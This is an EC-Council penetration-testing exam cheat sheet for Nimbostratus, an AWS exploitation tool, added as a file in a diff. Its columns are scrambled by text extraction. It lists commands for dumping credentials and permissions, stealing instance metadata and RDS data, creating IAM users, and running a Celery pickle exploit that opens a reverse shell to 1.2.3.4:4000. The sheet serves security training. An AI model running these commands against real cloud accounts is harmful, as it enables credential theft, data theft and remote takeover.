@@ -1,0 +1,37 @@
+Certified Penetration Testing Professional Exam 412-80
+Nimbostratus Cheat Sheet
+Certified Penetration Testing Professional
+Nimbostratus Cheat Sheet
+Nimbostratus
+Nimbostratus is a collection of tools used for fingerprinting and exploiting Amazon Cloud
+infrastructure.
+Commands Description
+Retrieve the credentials available on the host
+nimbostratus dump-credentials
+and output them to the console
+nimbostratus dump-permissions -- Retrieves all permissions for the given
+access-key=... --secret-key=... credentials
+Retrieves meta-data for the instance where
+nimbostratus dump-ec2-metadata
+you are executing the command
+nimbostratus dump-ec2-metadata -- Retrieves meta-data from a remote instance
+mangle- by using an exploit defined in
+function=core.utils.mangle.mangle
+core.utils.mangle.mangle
+nimbostratus snapshot-rds --
+access-key=... \
+--secret-key=... \ Retrieve data stored in the database by
+--password foolmeonce --rds-name creating a snapshot and restoring it
+nimbostratus \
+--region ap-southeast-1
+nimbostratus celery-pickle-
+exploit --access-key=... \ Verify whether the instance where this tool is
+--secret-key=... --reverse being executed has access to SQS, check
+1.2.3.4:4000 \ whether the Queue is using pickle and run
+--queue-name nimbostratus-celery arbitrary commands when un-pickled
+--region ap-southeast-1
+nimbostratus create-iam-user --
+Create new user
+access-key=... --secret-key=...
+Page | 1 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
